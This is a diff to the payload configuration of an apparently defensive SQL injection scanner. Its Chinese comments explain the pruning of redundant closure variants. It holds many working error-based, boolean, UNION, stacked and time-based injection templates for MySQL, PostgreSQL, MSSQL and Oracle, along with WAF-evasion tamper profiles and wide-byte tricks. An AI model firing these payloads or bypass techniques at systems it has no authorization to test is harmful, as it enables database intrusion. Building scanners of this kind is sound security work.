@@ -66,7 +66,9 @@ waf_detection:
 # 这些策略不是一开始就全部发送。
 # 只有正常 payload 返回疑似 WAF 拦截时，sql_scanner.py 才会按顺序重试。
 # places 表示这个策略适合哪些参数位置，避免把换行、Tab 这类字符放进 Cookie。
-max_tampered_payloads_per_probe: 16
+# WAF 场景也不对每条 payload 穷举所有同义变形。下面保留的 profile
+# 覆盖空白、大小写、逻辑运算符、比较符、字符串、版本注释和 URL 编码。
+max_tampered_payloads_per_probe: 12
 
 tamper_profiles:
   - name: space_comment
@@ -85,16 +87,20 @@ tamper_profiles:
       - keyword_mixed_case
       - space_to_comment
 
+  - name: tab_space
+    places: [query, form, json]
+    tampers:
+      - space_to_tab
+
+  - name: newline_space
+    places: [query, form, json]
+    tampers:
+      - space_to_newline
+
   - name: mysql_logic_symbol
     places: [query, form, json, cookie, header]
     tampers:
       - logic_operator_symbol
-      - space_to_comment
-
-  - name: equality_greater
-    places: [query, form, json, cookie, header]
-    tampers:
-      - equality_to_greater
       - space_to_comment
 
   - name: equality_between
@@ -110,22 +116,10 @@ tamper_profiles:
       - keyword_mixed_case
       - space_to_comment
 
-  - name: mysql_char_string
-    places: [query, form, json, cookie, header]
-    tampers:
-      - string_to_mysql_char
-      - keyword_mixed_case
-      - space_to_comment
-
   - name: mysql_versioned_comment
     places: [query, form, json, cookie, header]
     tampers:
       - keyword_versioned_comment
-
-  - name: keyword_comment
-    places: [query, form, json, cookie, header]
-    tampers:
-      - keyword_comment
 
   - name: mixed_case_keyword_comment
     places: [query, form, json, cookie, header]
@@ -134,31 +128,16 @@ tamper_profiles:
       - keyword_comment
 
   - name: encoded_quote_space_comment
-    places: [query, form, json, cookie, header]
+    places: [query, form]
     tampers:
       - quote_to_urlencode
       - keyword_mixed_case
       - space_to_comment
 
-  - name: tab_space
-    places: [query, form, json]
-    tampers:
-      - space_to_tab
-
-  - name: newline_space
-    places: [query, form, json]
-    tampers:
-      - space_to_newline
-
   - name: encoded_keyword
-    places: [query, form, json, cookie, header]
-    tampers:
-      - keyword_to_urlencode
-
-  - name: plus_space
     places: [query, form]
     tampers:
-      - space_to_plus
+      - keyword_to_urlencode
 
 sql_error_rules:
   - dbms: mysql
@@ -218,8 +197,8 @@ sql_error_rules:
       - 'syntax error'
 
 error_payload_suffixes:
-  # 每个后缀代表一种闭合方式。已删除 urlencode 后字节等价的重复项：
-  # `--%20` 与 `-- ` 等价、`%23` 与 `#` 等价、`')--%20` 与 `')-- ` 等价等。
+  # 默认检测保留每一种主要 SQL 上下文的代表性闭合方式，而不是穷举同义注释。
+  # `--%20`/`-- `、`%23`/`#` 等线上字节等价的变体不重复发送。
   - "'"
   - "\""
   - "`"
@@ -227,25 +206,15 @@ error_payload_suffixes:
   - "))"
   - "')"
   - "\")"
-  - "`)"
   - "'))"
   - "\"))"
-  - "`))"
   - "'-- "
-  - "'-- -"
   - "\"-- "
   - "'#"
-  - "\"#"
-  - "'/*"
-  - "\"/*"
   - "')-- "
   - "\")-- "
   - "'))-- "
   - "\"))-- "
-  - "')#"
-  - "\")#"
-  - "'))#"
-  - "\"))#"
   - "%df%27"
   - "%df%27-- "
   - " ORDER BY 999-- "
@@ -259,16 +228,9 @@ error_payload_templates:
   - "{value}' AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
   - "{value}\" AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
   - "{value}') AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
-  - "{value}\") AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
-  - "{value}')) AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
-  - "{value}\")) AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
-  - "{value}%df%27 AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
   - "{value} AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))"
   - "{value}' AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
-  - "{value}\" AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
   - "{value}') AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
-  - "{value}\") AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
-  - "{value}%df%27 AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
   - "{value} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,'PASS_SCAN_ERR',0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
   - "{value}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,'PASS_SCAN_ERR',0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "
   - "{value} AND CAST('PASS_SCAN_ERR' AS SIGNED)"
@@ -328,12 +290,8 @@ header_boolean_payload_groups:
     false: "{value}') AND ('passscan'='nope"
 
 boolean_payload_groups:
-  # 每组只代表一种“闭合上下文 + 真假逻辑”。
-  # 删掉的变体都能由 deep_tamper / WAF 重试等价生成，放在基础集是重复发包：
-  # - --%20 与 `-- ` urlencode 后字节等价；%23 与 `#` 等价。
-  # - /**/ 内联注释 = space_to_comment tamper。
-  # - && / || / %26%26 / %7c%7c = logic_operator_symbol tamper(+ url 编码)。
-  # 保留：数字型、各引号/括号闭合、OR 逻辑、宽字节、ORDER BY 子上下文。
+  # 这是覆盖集，不是闭合方式的笛卡尔积：数字、单双引号、括号/双括号、
+  # AND/OR、注释/无注释、宽字节和 ORDER BY 场景各至少保留一组。
   - name: number_and
     true: "{value} AND 7311=7311"
     false: "{value} AND 7311=7312"
@@ -342,22 +300,6 @@ boolean_payload_groups:
     true: "{value} AND 7311=7311-- "
     false: "{value} AND 7311=7312-- "
 
-  - name: number_and_hash
-    true: "{value} AND 7311=7311#"
-    false: "{value} AND 7311=7312#"
-
-  - name: number_between
-    true: "{value} AND 7311 BETWEEN 7311 AND 7311"
-    false: "{value} AND 7311 BETWEEN 7312 AND 7313"
-
-  - name: number_like
-    true: "{value} AND 'passscan' LIKE 'pass%'"
-    false: "{value} AND 'passscan' LIKE 'nope%'"
-
-  - name: single_quote_and
-    true: "{value}' AND 'passscan'='passscan"
-    false: "{value}' AND 'passscan'='nope"
-
   - name: single_quote_and_number_no_comment
     true: "{value}' AND 7311=7311 AND '1'='1"
     false: "{value}' AND 7311=7312 AND '1'='1"
@@ -365,14 +307,6 @@ boolean_payload_groups:
   - name: single_quote_comment
     true: "{value}' AND 7311=7311-- "
     false: "{value}' AND 7311=7312-- "
-
-  - name: single_quote_hash
-    true: "{value}' AND 7311=7311#"
-    false: "{value}' AND 7311=7312#"
-
-  - name: double_quote_and
-    true: "{value}\" AND \"passscan\"=\"passscan"
-    false: "{value}\" AND \"passscan\"=\"nope"
 
   - name: double_quote_and_number_no_comment
     true: "{value}\" AND 7311=7311 AND \"1\"=\"1"
@@ -390,17 +324,9 @@ boolean_payload_groups:
     true: "{value}') AND 7311=7311-- "
     false: "{value}') AND 7311=7312-- "
 
-  - name: paren_double_quote
-    true: "{value}\") AND (\"passscan\"=\"passscan"
-    false: "{value}\") AND (\"passscan\"=\"nope"
-
   - name: paren_double_quote_comment
     true: "{value}\") AND 7311=7311-- "
     false: "{value}\") AND 7311=7312-- "
-
-  - name: paren_number
-    true: "{value}) AND (7311=7311"
-    false: "{value}) AND (7311=7312"
 
   - name: paren_number_comment
     true: "{value}) AND 7311=7311-- "
@@ -445,30 +371,14 @@ inline_query:
       dbms: generic
       payload: "(SELECT '{marker}')"
 
-    - name: mysql_concat
-      dbms: mysql
-      payload: "(SELECT CONCAT('{marker}'))"
-
-    - name: postgresql_concat
-      dbms: postgresql
-      payload: "(SELECT '{marker}'||'')"
-
-    - name: mssql_concat
-      dbms: mssql
-      payload: "(SELECT '{marker}'+ '')"
-
     - name: oracle_dual
       dbms: oracle
       payload: "(SELECT '{marker}' FROM DUAL)"
 
-    - name: sqlite_select
-      dbms: sqlite
-      payload: "(SELECT '{marker}')"
-
 union_query:
   marker: PSMARKU7311
-  # 列数枚举上限。绝大多数真实查询的 SELECT 列数在 6 以内。
-  # 列数越大，payload 组合数按 1+2+...+n 增长，收益却快速下降。
+  # 列数枚举上限。默认模式每种闭合/列数选择一个代表性 marker 位置（48 条）；
+  # --full-payload-scan 才枚举每个 marker 位置（168 条）。
   max_columns: 6
   # 每个模板只代表一种“闭合上下文”，覆盖数字/单引号/双引号/括号/双括号/宽字节。
   # 不再保留 UNION ALL、--%20、%23、/**/、版本注释、混合换行这些变体：
@@ -583,21 +493,6 @@ stacked_payload_groups:
     control: "{value}');SELECT SLEEP(0)-- "
     delay: "{value}');SELECT SLEEP({time_delay})-- "
 
-  - name: mysql_paren_double_quote_stacked_sleep
-    dbms: mysql
-    control: "{value}\");SELECT SLEEP(0)-- "
-    delay: "{value}\");SELECT SLEEP({time_delay})-- "
-
-  - name: mysql_double_paren_single_quote_stacked_sleep
-    dbms: mysql
-    control: "{value}'));SELECT SLEEP(0)-- "
-    delay: "{value}'));SELECT SLEEP({time_delay})-- "
-
-  - name: mysql_wide_byte_stacked_sleep
-    dbms: mysql
-    control: "{value}%df%27;SELECT SLEEP(0)-- "
-    delay: "{value}%df%27;SELECT SLEEP({time_delay})-- "
-
   - name: postgresql_stacked_sleep
     dbms: postgresql
     control: "{value};SELECT PG_SLEEP(0)-- "
@@ -639,85 +534,25 @@ time_payload_groups:
     control: "{value}' AND SLEEP(0) AND '1'='1"
     delay: "{value}' AND SLEEP({time_delay}) AND '1'='1"
 
-  - name: mysql_single_quote_symbol_sleep
-    dbms: mysql
-    control: "{value}'&&SLEEP(0)&&'1"
-    delay: "{value}'&&SLEEP({time_delay})&&'1"
-
-  - name: mysql_single_quote_url_symbol_sleep
-    dbms: mysql
-    control: "{value}'%26%26SLEEP(0)%26%26'1"
-    delay: "{value}'%26%26SLEEP({time_delay})%26%26'1"
-
   - name: mysql_double_quote_sleep
     dbms: mysql
     control: "{value}\" AND SLEEP(0)-- "
     delay: "{value}\" AND SLEEP({time_delay})-- "
-
-  - name: mysql_double_quote_no_comment_sleep
-    dbms: mysql
-    control: "{value}\" AND SLEEP(0) AND \"1\"=\"1"
-    delay: "{value}\" AND SLEEP({time_delay}) AND \"1\"=\"1"
-
-  - name: mysql_double_quote_symbol_sleep
-    dbms: mysql
-    control: "{value}\"&&SLEEP(0)&&\"1"
-    delay: "{value}\"&&SLEEP({time_delay})&&\"1"
 
   - name: mysql_paren_single_quote_sleep
     dbms: mysql
     control: "{value}') AND SLEEP(0)-- "
     delay: "{value}') AND SLEEP({time_delay})-- "
 
-  - name: mysql_paren_single_quote_no_comment_sleep
-    dbms: mysql
-    control: "{value}') AND SLEEP(0) AND ('1'='1"
-    delay: "{value}') AND SLEEP({time_delay}) AND ('1'='1"
-
-  - name: mysql_paren_single_quote_symbol_sleep
-    dbms: mysql
-    control: "{value}')&&SLEEP(0)&&('1"
-    delay: "{value}')&&SLEEP({time_delay})&&('1"
-
   - name: mysql_paren_double_quote_sleep
     dbms: mysql
     control: "{value}\") AND SLEEP(0)-- "
     delay: "{value}\") AND SLEEP({time_delay})-- "
 
-  - name: mysql_double_paren_single_quote_sleep
-    dbms: mysql
-    control: "{value}')) AND SLEEP(0)-- "
-    delay: "{value}')) AND SLEEP({time_delay})-- "
-
-  - name: mysql_double_paren_double_quote_sleep
-    dbms: mysql
-    control: "{value}\")) AND SLEEP(0)-- "
-    delay: "{value}\")) AND SLEEP({time_delay})-- "
-
-  - name: mysql_wide_byte_sleep
-    dbms: mysql
-    control: "{value}%df%27 AND SLEEP(0)-- "
-    delay: "{value}%df%27 AND SLEEP({time_delay})-- "
-
   - name: mysql_order_by_number_sleep
     dbms: mysql
     control: "IF(7311=7311,SLEEP(0),0)"
     delay: "IF(7311=7311,SLEEP({time_delay}),0)"
-
-  - name: mysql_order_by_single_quote_sleep
-    dbms: mysql
-    control: "{value}' AND SLEEP(0)-- "
-    delay: "{value}' AND SLEEP({time_delay})-- "
-
-  - name: mysql_comment_sleep
-    dbms: mysql
-    control: "{value}/**/AND/**/SLEEP(0)"
-    delay: "{value}/**/AND/**/SLEEP({time_delay})"
-
-  - name: mysql_benchmark
-    dbms: mysql
-    control: "{value} AND BENCHMARK(1,MD5('PASS_SCAN'))"
-    delay: "{value} AND BENCHMARK(2500000,MD5('PASS_SCAN'))"
 
   - name: postgres_number_sleep
     dbms: postgresql
@@ -728,16 +563,6 @@ time_payload_groups:
     dbms: postgresql
     control: "{value}' AND 1=(SELECT 1 FROM pg_sleep(0))-- "
     delay: "{value}' AND 1=(SELECT 1 FROM pg_sleep({time_delay}))-- "
-
-  - name: mssql_number_waitfor
-    dbms: mssql
-    control: "{value}; WAITFOR DELAY '0:0:0'-- "
-    delay: "{value}; WAITFOR DELAY '0:0:{time_delay}'-- "
-
-  - name: mssql_single_quote_waitfor
-    dbms: mssql
-    control: "{value}'; WAITFOR DELAY '0:0:0'-- "
-    delay: "{value}'; WAITFOR DELAY '0:0:{time_delay}'-- "
 
   - name: oracle_number_pipe
     dbms: oracle
